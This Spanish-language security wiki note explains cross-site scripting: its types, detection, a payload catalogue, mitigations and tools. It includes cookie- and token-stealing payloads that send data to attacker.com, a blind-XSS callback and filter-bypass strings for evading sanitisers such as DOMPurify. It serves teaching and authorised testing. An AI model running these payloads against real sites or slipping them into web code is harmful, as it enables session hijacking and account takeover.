---
tags:
  - seguridad-web
  - owasp
  - xss
aliases:
  - XSS
  - Cross-Site Scripting
---

# XSS (Cross-Site Scripting)

**El Cross-Site Scripting (XSS)** es una vulnerabilidad que permite inyectar código del lado del cliente (normalmente JavaScript) en páginas web que después se ejecuta en el navegador de otros usuarios.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
El servidor o la aplicación insertan datos controlados por el atacante en el HTML/JS sin codificarlos ni validarlos. El navegador de la víctima interpreta esos datos como código y los ejecuta dentro del origen del sitio. El impacto va más allá de un `alert()`: robo de cookies de sesión y tokens, suplantación de la interfaz (phishing en el propio dominio), keylogging y, en general, toma de cuenta o exfiltración de datos sensibles.

Tres tipos principales:

| Tipo | Dónde vive el payload |
|---|---|
| **Reflejado** | En la petición (URL/parámetro); se devuelve en la respuesta y se ejecuta al abrir el enlace |
| **Almacenado** | Persistido en el servidor (comentarios, perfiles); se ejecuta cada vez que se ve la página |
| **DOM** | Nunca llega al servidor; un *sink* del DOM en el JS cliente procesa la entrada |

## Detección y pruebas
- Inyecta marcadores y observa si se reflejan sin codificar en la respuesta o en el DOM.
- En lugar de `alert(1)`, usa una prueba que revele el contexto de ejecución:

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

- Para XSS almacenado, `console.log()` evita tener que cerrar popups en cada carga; `<script>debugger;</script>` ayuda a confirmar ejecución.
- Para **XSS ciego** (formularios de contacto, tickets, paneles de admin, cabeceras `Referer`/`User-Agent`), usa un callback a un servidor propio:

```html
<script src=//attacker.com></script>
```

Herramientas como Dalfox o XSStrike automatizan la detección.

## Explotación / payloads

**Payloads básicos (contexto HTML):**

```html
<script>alert('XSS')</script>
"><script>alert(document.domain)</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

**Robo de cookies / tokens (data grabber):**

```html
<script>document.location='https://attacker.com/c.php?c='+document.cookie</script>
<script>new Image().src="https://attacker.com/c.php?c="+localStorage.getItem('access_token')</script>
<script>fetch('https://attacker.com',{method:'POST',mode:'no-cors',body:document.cookie})</script>
```

**XSS basado en DOM** (sobre un *sink* vulnerable, p. ej. `location.hash`):

```html
#"><img src=/ onerror=alert(document.domain)>
```

**Contexto JavaScript** (romper la cadena y cerrar la sentencia):

```javascript
'; alert(document.domain);//
-(confirm)(document.domain)//
```

**Bypass de filtros** (codificación, mayúsculas, etiquetas anidadas, esquemas):

```html
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
javascript:alert(1)
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
```

**XSS en ficheros** (SVG subido como avatar/imagen):

```html
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

**Polyglot / mutación (mXSS)** para evadir saneadores como DOMPurify:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## Mitigación
- **Codificación de salida (output encoding)** según el contexto donde se inserta el dato: HTML, atributo, JS, URL o CSS. Es la defensa principal.
- **Content Security Policy (CSP)**: restringe orígenes de scripts, bloquea `inline`/`eval` y mitiga la exfiltración aunque exista una inyección.
- **Validación/saneamiento de entrada** con allowlists; para HTML enriquecido usar un sanitizador robusto (DOMPurify) y mantenerlo actualizado.
- Cookies con `HttpOnly` (las hace inaccesibles desde JS) y `Secure`.
- Atributo `sandbox` en iframes y aislamiento de contenido generado por usuarios en dominios separados.

## Herramientas
- **Dalfox** — fuzzer de XSS en Go, muy rápido.
- **XSStrike** — detección y generación de payloads.
- **xsser**, **XSpear**, **domdig** — escaneo con navegador headless.
- **ezXSS / bXSS** — gestión de XSS ciego.

---
🔗 Relacionado: [[CSRF (Cross-Site Request Forgery)]] · [[SSRF (Server-Side Request Forgery)]] · [[Laboratorio DVWA (CTF)]]
📚 Fuente: [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) (MIT, © Swissky)
